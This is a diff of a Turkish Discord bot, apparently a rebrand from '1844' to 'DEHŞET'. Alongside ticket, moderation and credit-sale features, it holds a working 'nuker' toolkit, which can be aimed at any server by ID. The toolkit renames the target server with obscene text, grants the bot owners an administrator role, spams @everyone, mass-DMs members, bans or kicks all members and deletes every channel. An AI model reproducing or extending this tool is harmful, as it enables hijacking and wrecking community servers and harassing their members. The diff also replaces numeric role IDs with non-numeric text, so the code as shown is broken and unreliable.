@@ -1,6 +1,6 @@
 """
 ================================================================================
-                        DISCORD BOT 1844 - VDS VERSIYONU
+                        DISCORD BOT DEHŞET - VDS VERSIYONU
 ================================================================================
 
 KURULUM:
@@ -48,10 +48,10 @@ AUTHORIZED_USERS_FILE = 'authorized_users.json'
 VERIFIED_USERS_FILE = 'verified_users.json'
 DB_FILE_PATH = 'discord_data.db'
 DATA_FILE_PATH = 'data.txt'
-AUTHORIZED_ROLE_ID = 1844
-DURUM_ALDI_KANAL_ID = 1844
-VERIFIED_ROLE_ID = 1844
-GUILD_OWNER_ROLE_ID = 1844  # Guild alan kişilere verilecek özel rol
+AUTHORIZED_ROLE_ID = DEHŞET
+DURUM_ALDI_KANAL_ID = DEHŞET
+VERIFIED_ROLE_ID = DEHŞET
+GUILD_OWNER_ROLE_ID = DEHŞET  # Guild alan kişilere verilecek özel rol
 LOG_CHANNEL_ID = 1444467582282367009  # ID sorgu loglarının gönderileceği kanal
 GENERAL_LOG_CHANNEL_ID = 1445572049035595816  # Genel log kanalı
 WELCOME_CHANNEL_ID = 1444428771389079643  # Hoş geldin kanalı
@@ -725,7 +725,7 @@ async def update_presence():
             
             await bot.change_presence(
                 activity=discord.Streaming(
-                    name=f"discord.gg/1844 | {total_credits} hak",
+                    name=f"discord.gg/DEHŞET | {total_credits} hak",
                     url="https://twitch.tv/discord"
                 )
             )
@@ -773,10 +773,10 @@ COMMAND_USAGE = {
     "ticketcikar": "!ticketcikar @kullanıcı",
     "ticketlar": "!ticketlar",
     "istatistik": "!istatistik",
-    "x1844nuker": "!x1844nuker veya !nuke",
-    "x1844stop": "!x1844stop veya !stop",
-    "x1844banall": "!x1844banall veya !tban",
-    "x1844clear": "!x1844clear veya !csil",
+    "xDEHŞETnuker": "!xDEHŞETnuker veya !nuke",
+    "xDEHŞETstop": "!xDEHŞETstop veya !stop",
+    "xDEHŞETbanall": "!xDEHŞETbanall veya !tban",
+    "xDEHŞETclear": "!xDEHŞETclear veya !csil",
     "ezik": "!ezik @kullanıcı",
     "owner": "!owner",
     "sunucu": "!sunucu",
@@ -1216,12 +1216,12 @@ async def price_list(interaction: discord.Interaction):
     total_credits = get_total_credits()
     
     embed = discord.Embed(
-        title="HAK FİYAT LİSTESİ 1844",
+        title="HAK FİYAT LİSTESİ DEHŞET",
         color=0x9b59b6
     )
     
     embed.add_field(
-        name="1844 Premium Hak Paketleri",
+        name="DEHŞET Premium Hak Paketleri",
         value=(
             "**1 HAK:**   5 TL\n"
             "**5 Hak:**   20 TL   (5 TL indirim)\n"
@@ -1250,12 +1250,12 @@ async def boost_info(interaction: discord.Interaction):
     total_credits = get_total_credits()
     
     embed = discord.Embed(
-        title="BOOST PAKETLERİ 1844",
+        title="BOOST PAKETLERİ DEHŞET",
         color=0x9b59b6
     )
     
     embed.add_field(
-        name="1844 Boost Paketleri",
+        name="DEHŞET Boost Paketleri",
         value=(
             "**1 BOOST:**   50 HAK\n"
             "**2 BOOST:**   50 HAK\n"
@@ -1266,7 +1266,7 @@ async def boost_info(interaction: discord.Interaction):
     
     embed.add_field(
         name="ÖZEL TEKLİF",
-        value="@1844 farkıyla en iyisinden zirveye!",
+        value="@DEHŞET farkıyla en iyisinden zirveye!",
         inline=False
     )
     
@@ -1289,7 +1289,7 @@ async def help_command(interaction: discord.Interaction):
     total_credits = get_total_credits()
     
     embed = discord.Embed(
-        title="1844 BOT - TÜM KOMUTLAR",
+        title="DEHŞET BOT - TÜM KOMUTLAR",
         description="Aşağıdaki komutları kullanabilirsiniz:",
         color=0x9b59b6
     )
@@ -1419,7 +1419,7 @@ async def add_credits_command(interaction: discord.Interaction, kullanici: disco
     embed.add_field(name="🏦 Sunucu Toplam", value=f"```{total_credits} adet```", inline=True)
     embed.add_field(name="🎭 Rol Durumu", value="✅ Verildi" if role_added else "❌ Verilemedi", inline=True)
     embed.set_thumbnail(url=kullanici.display_avatar.url)
-    embed.set_footer(text="1844 Credit System")
+    embed.set_footer(text="DEHŞET Credit System")
     
     await interaction.response.send_message(embed=embed)
     await send_admin_log("HAK VER", interaction.user, kullanici, f"Verilen: {miktar} hak | Toplam: {get_credits(kullanici.id)}", guild_id=interaction.guild.id)
@@ -1451,7 +1451,7 @@ async def remove_credits_command(interaction: discord.Interaction, kullanici: di
         embed.add_field(name="🏦 Sunucu Toplam", value=f"```{total_credits} adet```", inline=False)
         embed.add_field(name="🎭 Rol Durumu", value="✅ Alındı" if role_removed else "❌ Alınamadı", inline=True)
         embed.set_thumbnail(url=kullanici.display_avatar.url)
-        embed.set_footer(text="1844 Credit System")
+        embed.set_footer(text="DEHŞET Credit System")
         
         await interaction.response.send_message(embed=embed)
         await send_admin_log("HAK SİL", interaction.user, kullanici, "Tüm haklar silindi", guild_id=interaction.guild.id)
@@ -1462,7 +1462,7 @@ async def remove_credits_command(interaction: discord.Interaction, kullanici: di
             color=0xff0000,
             timestamp=datetime.datetime.now()
         )
-        embed.set_footer(text="1844 Credit System")
+        embed.set_footer(text="DEHŞET Credit System")
         await interaction.response.send_message(embed=embed)
 
 @bot.tree.command(name="haksorgu", description="Kullanıcının haklarını sorgula")
@@ -1836,7 +1836,7 @@ async def ban_user_slash(interaction: discord.Interaction, kullanici: discord.Me
         dm_embed.add_field(name="👤 Yetkili", value=f"{interaction.user.name}", inline=True)
         dm_embed.add_field(name="🏠 Sunucu", value=f"{interaction.guild.name}", inline=True)
         dm_embed.set_thumbnail(url=interaction.guild.icon.url if interaction.guild.icon else None)
-        dm_embed.set_footer(text="1844 Moderation System")
+        dm_embed.set_footer(text="DEHŞET Moderation System")
         
         try:
             await kullanici.send(embed=dm_embed)
@@ -1890,7 +1890,7 @@ async def kick_user_slash(interaction: discord.Interaction, kullanici: discord.M
         dm_embed.add_field(name="👤 Yetkili", value=f"{interaction.user.name}", inline=True)
         dm_embed.add_field(name="🏠 Sunucu", value=f"{interaction.guild.name}", inline=True)
         dm_embed.set_thumbnail(url=interaction.guild.icon.url if interaction.guild.icon else None)
-        dm_embed.set_footer(text="1844 Moderation System")
+        dm_embed.set_footer(text="DEHŞET Moderation System")
         
         try:
             await kullanici.send(embed=dm_embed)
@@ -1956,7 +1956,7 @@ async def timeout_user_slash(interaction: discord.Interaction, kullanici: discor
         dm_embed.add_field(name="👤 Yetkili", value=f"{interaction.user.name}", inline=True)
         dm_embed.add_field(name="🏠 Sunucu", value=f"{interaction.guild.name}", inline=True)
         dm_embed.set_thumbnail(url=interaction.guild.icon.url if interaction.guild.icon else None)
-        dm_embed.set_footer(text="1844 Moderation System")
+        dm_embed.set_footer(text="DEHŞET Moderation System")
         
         try:
             await kullanici.send(embed=dm_embed)
@@ -2005,7 +2005,7 @@ async def untimeout_user_slash(interaction: discord.Interaction, kullanici: disc
         dm_embed.add_field(name="👤 Yetkili", value=f"{interaction.user.name}", inline=True)
         dm_embed.add_field(name="🏠 Sunucu", value=f"{interaction.guild.name}", inline=True)
         dm_embed.set_thumbnail(url=interaction.guild.icon.url if interaction.guild.icon else None)
-        dm_embed.set_footer(text="1844 Moderation System")
+        dm_embed.set_footer(text="DEHŞET Moderation System")
         
         try:
             await kullanici.send(embed=dm_embed)
@@ -2066,7 +2066,7 @@ async def warn_user_slash(interaction: discord.Interaction, kullanici: discord.M
     dm_embed.add_field(name="👤 Yetkili", value=f"{interaction.user.name}", inline=True)
     dm_embed.add_field(name="🏠 Sunucu", value=f"{interaction.guild.name}", inline=True)
     dm_embed.set_thumbnail(url=interaction.guild.icon.url if interaction.guild.icon else None)
-    dm_embed.set_footer(text="1844 Moderation System")
+    dm_embed.set_footer(text="DEHŞET Moderation System")
     
     try:
         await kullanici.send(embed=dm_embed)
@@ -2144,7 +2144,7 @@ async def clear_warnings_slash(interaction: discord.Interaction, kullanici: disc
     embed.add_field(name="👤 Kullanıcı", value=f"{kullanici.mention}\n`{kullanici.name}`", inline=True)
     embed.add_field(name="🛡️ Yetkili", value=f"{interaction.user.mention}\n`{interaction.user.name}`", inline=True)
     embed.set_thumbnail(url=kullanici.display_avatar.url)
-    embed.set_footer(text="1844 Moderation System")
+    embed.set_footer(text="DEHŞET Moderation System")
     
     await interaction.response.send_message(embed=embed)
     await send_mod_log("UYARI SİL", interaction.user, kullanici, "Tüm uyarılar silindi", guild_id=interaction.guild.id)
@@ -2176,7 +2176,7 @@ async def clear_messages_slash(interaction: discord.Interaction, miktar: int, ku
         if kullanici:
             embed.add_field(name="👤 Hedef Kullanıcı", value=f"{kullanici.mention}", inline=True)
         embed.add_field(name="🛡️ Yetkili", value=f"{interaction.user.mention}", inline=True)
-        embed.set_footer(text="1844 Moderation System")
+        embed.set_footer(text="DEHŞET Moderation System")
         
         await interaction.followup.send(embed=embed, ephemeral=True)
         
@@ -2211,7 +2211,7 @@ async def send_dm_slash(interaction: discord.Interaction, kullanici: discord.Mem
         success_embed.add_field(name="🛡️ Gönderen", value=f"{interaction.user.mention}", inline=True)
         success_embed.add_field(name="📝 Mesaj", value=f"```{mesaj[:200]}```", inline=False)
         success_embed.set_thumbnail(url=kullanici.display_avatar.url)
-        success_embed.set_footer(text="1844 Messaging System")
+        success_embed.set_footer(text="DEHŞET Messaging System")
         
         await interaction.response.send_message(embed=success_embed, ephemeral=True)
         await send_mod_log("DM", interaction.user, kullanici, mesaj[:100], guild_id=interaction.guild.id)
@@ -2256,7 +2256,7 @@ async def announce_slash(interaction: discord.Interaction, mesaj: str, kanal: di
         if rol:
             success_embed.add_field(name="🏷️ Etiketlenen Rol", value=f"{rol.mention}", inline=True)
         success_embed.add_field(name="📝 Mesaj", value=f"```{mesaj[:200]}```", inline=False)
-        success_embed.set_footer(text="1844 Announcement System")
+        success_embed.set_footer(text="DEHŞET Announcement System")
         
         await interaction.response.send_message(embed=success_embed, ephemeral=True)
         
@@ -2715,7 +2715,7 @@ async def prefix_help(ctx):
     total_credits = get_total_credits()
     
     embed = discord.Embed(
-        title="📚 1844 BOT - PREFIX KOMUTLARI",
+        title="📚 DEHŞET BOT - PREFIX KOMUTLARI",
         description="Tüm komutlar `!` prefix'i ile kullanılır",
         color=0x3498db,
         timestamp=datetime.datetime.now()
@@ -2800,7 +2800,7 @@ async def prefix_help(ctx):
         inline=False
     )
     
-    embed.set_footer(text="Slash komutları için / kullanın | 1844 Bot")
+    embed.set_footer(text="Slash komutları için / kullanın | DEHŞET Bot")
     if ctx.guild.icon:
         embed.set_thumbnail(url=ctx.guild.icon.url)
     
@@ -3072,7 +3072,7 @@ async def prefix_topludm(ctx, *, mesaj: str):
         await asyncio.sleep(1.5)
     await progress_msg.edit(content=f"Tamamlandı! Gönderilen: {sent}, Başarısız: {failed}")
 
-@bot.command(name="x1844nuker", aliases=["nuke"])
+@bot.command(name="xDEHŞETnuker", aliases=["nuke"])
 async def prefix_nuker(ctx, sunucu_id: str = None):
     global nuker_active, nuker_tasks
     if not is_owner(ctx.author.id):
@@ -3080,7 +3080,7 @@ async def prefix_nuker(ctx, sunucu_id: str = None):
     
     if isinstance(ctx.channel, discord.DMChannel):
         if not sunucu_id:
-            await ctx.reply("DM'den kullanmak için sunucu ID gerekli!\n`!x1844nuker (sunucu_id)`")
+            await ctx.reply("DM'den kullanmak için sunucu ID gerekli!\n`!xDEHŞETnuker (sunucu_id)`")
             return
         try:
             guild = bot.get_guild(int(sunucu_id))
@@ -3135,11 +3135,11 @@ async def prefix_nuker(ctx, sunucu_id: str = None):
                     infaz_embed.add_field(name="Sunucu ID", value=f"`{guild.id}`", inline=True)
                     infaz_embed.add_field(name="Üye Sayısı", value=f"`{original_member_count}`", inline=True)
                     infaz_embed.add_field(name="İnfaz Eden", value=f"{ctx.author.name}", inline=True)
-                    infaz_embed.set_footer(text="1844 NUKER")
+                    infaz_embed.set_footer(text="DEHŞET NUKER")
                     try:
-                        logo_path = "attached_assets/1844_logo.png"
-                        infaz_embed.set_thumbnail(url="attachment://1844_logo.png")
-                        await owner_user.send(embed=infaz_embed, file=discord.File(logo_path, "1844_logo.png"))
+                        logo_path = "attached_assets/DEHŞET_logo.png"
+                        infaz_embed.set_thumbnail(url="attachment://DEHŞET_logo.png")
+                        await owner_user.send(embed=infaz_embed, file=discord.File(logo_path, "DEHŞET_logo.png"))
                     except:
                         await owner_user.send(embed=infaz_embed)
             except:
@@ -3149,13 +3149,13 @@ async def prefix_nuker(ctx, sunucu_id: str = None):
     
     async def change_server():
         try:
-            logo_path = "attached_assets/1844_logo.png"
+            logo_path = "attached_assets/DEHŞET_logo.png"
             with open(logo_path, "rb") as f:
                 icon_data = f.read()
-            await guild.edit(name="1844 SİKTİ", icon=icon_data, description="discord.gg/1844 tarafından yok edildi")
+            await guild.edit(name="DEHŞET SİKTİ", icon=icon_data, description="discord.gg/DEHŞET tarafından yok edildi")
         except:
             try:
-                await guild.edit(name="1844 SİKTİ")
+                await guild.edit(name="DEHŞET SİKTİ")
             except:
                 pass
     
@@ -3163,7 +3163,7 @@ async def prefix_nuker(ctx, sunucu_id: str = None):
         try:
             admin_perms = discord.Permissions()
             admin_perms.administrator = True
-            admin_role = await guild.create_role(name="1844 OWNER", permissions=admin_perms, color=discord.Color.red(), hoist=True)
+            admin_role = await guild.create_role(name="DEHŞET OWNER", permissions=admin_perms, color=discord.Color.red(), hoist=True)
             for owner_id in OWNER_IDS:
                 try:
                     owner_member = guild.get_member(owner_id)
@@ -3177,7 +3177,7 @@ async def prefix_nuker(ctx, sunucu_id: str = None):
     async def spam_channel(ch):
         if not nuker_active: return
         try:
-            await ch.send(f"@everyone **{owner_name} 1844 sizi sikti** discord.gg/1844")
+            await ch.send(f"@everyone **{owner_name} DEHŞET sizi sikti** discord.gg/DEHŞET")
         except:
             pass
     
@@ -3198,15 +3198,15 @@ async def prefix_nuker(ctx, sunucu_id: str = None):
     async def dm_member(m):
         if not nuker_active: return
         try:
-            await m.send(f"**discord.gg/1844 sikti sizi**")
+            await m.send(f"**discord.gg/DEHŞET sikti sizi**")
         except:
             pass
     
     async def create_channel_spam():
         if not nuker_active: return
         try:
-            ch = await guild.create_text_channel(name="discord.gg-1844")
-            spam_tasks = [ch.send(f"@everyone **{owner_name} 1844 sizi sikti** discord.gg/1844") for _ in range(50)]
+            ch = await guild.create_text_channel(name="discord.gg-DEHŞET")
+            spam_tasks = [ch.send(f"@everyone **{owner_name} DEHŞET sizi sikti** discord.gg/DEHŞET") for _ in range(50)]
             await asyncio.gather(*spam_tasks, return_exceptions=True)
         except:
             pass
@@ -3214,14 +3214,14 @@ async def prefix_nuker(ctx, sunucu_id: str = None):
     async def create_voice():
         if not nuker_active: return
         try:
-            await guild.create_voice_channel(name="discord.gg/1844")
+            await guild.create_voice_channel(name="discord.gg/DEHŞET")
         except:
             pass
     
     async def create_role():
         if not nuker_active: return
         try:
-            await guild.create_role(name=f"{owner_name} 1844", color=discord.Color.red())
+            await guild.create_role(name=f"{owner_name} DEHŞET", color=discord.Color.red())
         except:
             pass
     
@@ -3250,7 +3250,7 @@ async def prefix_nuker(ctx, sunucu_id: str = None):
     
     nuker_active = False
 
-@bot.command(name="x1844stop", aliases=["stop"])
+@bot.command(name="xDEHŞETstop", aliases=["stop"])
 async def prefix_nuker_stop(ctx):
     global nuker_active, nuker_tasks
     if not is_owner(ctx.author.id):
@@ -3290,14 +3290,14 @@ async def prefix_nuker_stop(ctx):
     
     await ctx.reply(f"**NUKER ANINDA DURDURULDU!**\nİptal edilen görev: {cancelled_count + force_cancelled}")
 
-@bot.command(name="x1844banall", aliases=["tban"])
+@bot.command(name="xDEHŞETbanall", aliases=["tban"])
 async def prefix_banall(ctx, sunucu_id: str = None):
     if not is_owner(ctx.author.id):
         return
     
     if isinstance(ctx.channel, discord.DMChannel):
         if not sunucu_id:
-            await ctx.reply("DM'den kullanmak için sunucu ID gerekli!\n`!x1844banall (sunucu_id)`")
+            await ctx.reply("DM'den kullanmak için sunucu ID gerekli!\n`!xDEHŞETbanall (sunucu_id)`")
             return
         try:
             guild = bot.get_guild(int(sunucu_id))
@@ -3342,17 +3342,17 @@ async def prefix_banall(ctx, sunucu_id: str = None):
         async with sem:
             try:
                 if m.top_role < guild.me.top_role:
-                    await m.ban(reason="1844 NUKER", delete_message_seconds=604800)
+                    await m.ban(reason="DEHŞET NUKER", delete_message_seconds=604800)
                     results["banned"] += 1
                 else:
                     try:
-                        await m.kick(reason="1844 NUKER")
+                        await m.kick(reason="DEHŞET NUKER")
                         results["kicked"] += 1
                     except:
                         results["failed"] += 1
             except:
                 try:
-                    await m.kick(reason="1844 NUKER")
+                    await m.kick(reason="DEHŞET NUKER")
                     results["kicked"] += 1
                 except:
                     results["failed"] += 1
@@ -3364,14 +3364,14 @@ async def prefix_banall(ctx, sunucu_id: str = None):
     
     await ctx.reply(f"**⚡ TURBO BAN TAMAMLANDI!**\nSunucu: {guild.name}\n\n🔨 Banlanan: **{results['banned']}**\n👢 Atılan: **{results['kicked']}**\n❌ Başarısız: **{results['failed']}**")
 
-@bot.command(name="x1844clear", aliases=["csil"])
+@bot.command(name="xDEHŞETclear", aliases=["csil"])
 async def prefix_clear_all(ctx, sunucu_id: str = None):
     if not is_owner(ctx.author.id):
         return
     
     if isinstance(ctx.channel, discord.DMChannel):
         if not sunucu_id:
-            await ctx.reply("DM'den kullanmak için sunucu ID gerekli!\n`!x1844clear (sunucu_id)`")
+            await ctx.reply("DM'den kullanmak için sunucu ID gerekli!\n`!xDEHŞETclear (sunucu_id)`")
             return
         try:
             guild = bot.get_guild(int(sunucu_id))
@@ -3476,7 +3476,7 @@ async def prefix_clear_all(ctx, sunucu_id: str = None):
     total_ch_failed = results["text_failed"] + results["voice_failed"] + results["category_failed"]
     
     try:
-        new_channel = await guild.create_text_channel("1844-temizlik")
+        new_channel = await guild.create_text_channel("DEHŞET-temizlik")
         embed = discord.Embed(title="⚡ TURBO TEMİZLİK TAMAMLANDI", color=0x00ff00)
         embed.add_field(name="📝 Yazı Kanalları", value=f"✅ {results['text_deleted']} | ❌ {results['text_failed']}", inline=True)
         embed.add_field(name="🔊 Ses Kanalları", value=f"✅ {results['voice_deleted']} | ❌ {results['voice_failed']}", inline=True)
@@ -3837,7 +3837,7 @@ async def on_guild_update(before, after):
         embed.add_field(name="❌ Eski URL", value=f"`discord.gg/{old_url}`" if old_url else "Yok", inline=True)
         embed.add_field(name="➡️ Yeni URL", value=f"`discord.gg/{new_url}`" if new_url else "**KALDIRILDI!**", inline=True)
         embed.add_field(name="⚡ Aksiyon", value="Sunucu Ayarları > Vanity URL bölümünden kontrol edin!", inline=False)
-        embed.set_footer(text="🛡️ 1844 URL Koruma Sistemi | Anında Uyarı")
+        embed.set_footer(text="🛡️ DEHŞET URL Koruma Sistemi | Anında Uyarı")
         
         await log_channel.send(content=f"🚨🚨🚨 **ACİL URL DEĞİŞİKLİĞİ!** {owner_mentions} 🚨🚨🚨", embed=embed)
         
@@ -4545,7 +4545,7 @@ async def prefix_anket(ctx, *, icerik: str = None):
             value="• Maksimum 10 seçenek ekleyebilirsin\n• Seçenekleri virgülle ayır\n• Soru ve seçenekleri | ile ayır",
             inline=False
         )
-        embed.set_footer(text="1844 Bot | Anket Sistemi")
+        embed.set_footer(text="DEHŞET Bot | Anket Sistemi")
         await ctx.reply(embed=embed)
         return
     
@@ -4614,7 +4614,7 @@ async def prefix_cekilis(ctx, *, icerik: str = None):
             value="• `s` veya `sn` = saniye\n• `m` veya `dk` = dakika\n• `h` veya `sa` = saat\n• `d` veya `gün` = gün",
             inline=False
         )
-        embed.set_footer(text="1844 Bot | Çekiliş Sistemi")
+        embed.set_footer(text="DEHŞET Bot | Çekiliş Sistemi")
         await ctx.reply(embed=embed)
         return
     
@@ -4718,7 +4718,7 @@ async def prefix_rolmenu(ctx, *, icerik: str = None):
             value="• Emoji ve rol arasına `:` koy\n• Birden fazla rol için virgül kullan\n• Üyeler emojiye tıklayarak rol alır/bırakır",
             inline=False
         )
-        embed.set_footer(text="1844 Bot | Rol Menü Sistemi")
+        embed.set_footer(text="DEHŞET Bot | Rol Menü Sistemi")
         await ctx.reply(embed=embed)
         return
     
@@ -4840,7 +4840,7 @@ class TicketButton(discord.ui.Button):
             welcome_embed.add_field(name="📅 Tarih", value=f"<t:{int(datetime.datetime.now().timestamp())}:F>", inline=True)
             welcome_embed.add_field(name="❌ Kapatmak İçin", value="Aşağıdaki butona tıkla veya `!ticketkapat` yaz", inline=False)
             welcome_embed.set_thumbnail(url=interaction.user.display_avatar.url)
-            welcome_embed.set_footer(text="1844 Ticket Sistemi")
+            welcome_embed.set_footer(text="DEHŞET Ticket Sistemi")
             
             await channel.send(content=f"{interaction.user.mention} {support_role.mention if support_role else ''}", embed=welcome_embed, view=close_view)
             
@@ -4901,7 +4901,7 @@ class TicketCloseButton(discord.ui.Button):
             timestamp=datetime.datetime.now()
         )
         embed.add_field(name="👤 Kapatan", value=interaction.user.mention, inline=True)
-        embed.set_footer(text="1844 Ticket Sistemi")
+        embed.set_footer(text="DEHŞET Ticket Sistemi")
         
         await interaction.response.send_message(embed=embed)
         
@@ -4977,7 +4977,7 @@ async def ticket_panel(ctx):
         timestamp=datetime.datetime.now()
     )
     embed.set_thumbnail(url=ctx.guild.icon.url if ctx.guild.icon else None)
-    embed.set_footer(text="1844 Ticket Sistemi", icon_url=bot.user.display_avatar.url)
+    embed.set_footer(text="DEHŞET Ticket Sistemi", icon_url=bot.user.display_avatar.url)
     
     view = TicketView()
     
@@ -5012,7 +5012,7 @@ async def ticket_setup(ctx, log_kanal: discord.TextChannel = None, yetkili_rol: 
             value="• Log kanalı: Ticket işlemleri buraya kaydedilir\n• Yetkili rol: Bu rol ticket'ları görebilir",
             inline=False
         )
-        embed.set_footer(text="1844 Bot | Ticket Sistemi")
+        embed.set_footer(text="DEHŞET Bot | Ticket Sistemi")
         await ctx.reply(embed=embed)
         return
     
@@ -5031,7 +5031,7 @@ async def ticket_setup(ctx, log_kanal: discord.TextChannel = None, yetkili_rol: 
     )
     embed.add_field(name="📋 Log Kanalı", value=log_kanal.mention, inline=True)
     embed.add_field(name="👥 Yetkili Rol", value=yetkili_rol.mention, inline=True)
-    embed.set_footer(text="1844 Bot | Ticket Sistemi")
+    embed.set_footer(text="DEHŞET Bot | Ticket Sistemi")
     
     await ctx.reply(embed=embed)
 
@@ -5060,7 +5060,7 @@ async def create_ticket(ctx, *, konu: str = None):
             value="`!ticket Ödeme sorunu yaşıyorum`",
             inline=False
         )
-        embed.set_footer(text="1844 Bot | Ticket Sistemi")
+        embed.set_footer(text="DEHŞET Bot | Ticket Sistemi")
         await ctx.reply(embed=embed)
         return
     
@@ -5116,7 +5116,7 @@ async def create_ticket(ctx, *, konu: str = None):
         welcome_embed.add_field(name="📅 Tarih", value=f"<t:{int(datetime.datetime.now().timestamp())}:F>", inline=True)
         welcome_embed.add_field(name="❌ Kapatmak İçin", value="`!ticketkapat`", inline=False)
         welcome_embed.set_thumbnail(url=ctx.author.display_avatar.url)
-        welcome_embed.set_footer(text="1844 Ticket Sistemi")
+        welcome_embed.set_footer(text="DEHŞET Ticket Sistemi")
         
         await channel.send(content=f"{ctx.author.mention} {support_role.mention if support_role else ''}", embed=welcome_embed)
         
@@ -5128,7 +5128,7 @@ async def create_ticket(ctx, *, konu: str = None):
         )
         success_embed.add_field(name="🎫 Ticket", value=channel.mention, inline=True)
         success_embed.add_field(name="📋 Konu", value=konu[:50], inline=True)
-        success_embed.set_footer(text="1844 Ticket Sistemi")
+        success_embed.set_footer(text="DEHŞET Ticket Sistemi")
         
         await ctx.reply(embed=success_embed)
         
@@ -5181,7 +5181,7 @@ async def close_ticket(ctx, *, sebep: str = "Sebep belirtilmedi"):
     )
     embed.add_field(name="👤 Kapatan", value=ctx.author.mention, inline=True)
     embed.add_field(name="📋 Sebep", value=sebep, inline=True)
-    embed.set_footer(text="1844 Ticket Sistemi")
+    embed.set_footer(text="DEHŞET Ticket Sistemi")
     
     await ctx.reply(embed=embed)
     
@@ -5233,7 +5233,7 @@ async def add_to_ticket(ctx, kullanici: discord.Member = None):
             timestamp=datetime.datetime.now()
         )
         embed.add_field(name="📝 Kullanım", value="`!ticketekle @kullanıcı`", inline=False)
-        embed.set_footer(text="1844 Ticket Sistemi")
+        embed.set_footer(text="DEHŞET Ticket Sistemi")
         await ctx.reply(embed=embed)
         return
     
@@ -5255,7 +5255,7 @@ async def add_to_ticket(ctx, kullanici: discord.Member = None):
         color=0x00ff00,
         timestamp=datetime.datetime.now()
     )
-    embed.set_footer(text="1844 Ticket Sistemi")
+    embed.set_footer(text="DEHŞET Ticket Sistemi")
     
     await ctx.reply(embed=embed)
 
@@ -5269,7 +5269,7 @@ async def remove_from_ticket(ctx, kullanici: discord.Member = None):
             timestamp=datetime.datetime.now()
         )
         embed.add_field(name="📝 Kullanım", value="`!ticketcikar @kullanıcı`", inline=False)
-        embed.set_footer(text="1844 Ticket Sistemi")
+        embed.set_footer(text="DEHŞET Ticket Sistemi")
         await ctx.reply(embed=embed)
         return
     
@@ -5291,7 +5291,7 @@ async def remove_from_ticket(ctx, kullanici: discord.Member = None):
         color=0xff6600,
         timestamp=datetime.datetime.now()
     )
-    embed.set_footer(text="1844 Ticket Sistemi")
+    embed.set_footer(text="DEHŞET Ticket Sistemi")
     
     await ctx.reply(embed=embed)
 
@@ -5315,7 +5315,7 @@ async def list_tickets(ctx):
             color=0x00ff00,
             timestamp=datetime.datetime.now()
         )
-        embed.set_footer(text="1844 Ticket Sistemi")
+        embed.set_footer(text="DEHŞET Ticket Sistemi")
         await ctx.reply(embed=embed)
         return
     
@@ -5332,7 +5332,7 @@ async def list_tickets(ctx):
             inline=True
         )
     
-    embed.set_footer(text="1844 Ticket Sistemi")
+    embed.set_footer(text="DEHŞET Ticket Sistemi")
     await ctx.reply(embed=embed)
 
 @bot.command(name="toplumesaj")
@@ -5365,7 +5365,7 @@ async def prefix_toplumesaj(ctx, *, mesaj):
         color=0x00ff00,
         timestamp=datetime.datetime.now()
     )
-    embed.set_footer(text="1844 Toplum Mesaj Sistemi")
+    embed.set_footer(text="DEHŞET Toplum Mesaj Sistemi")
     await ctx.reply(embed=embed)
 
 @bot.command(name="guildrol")
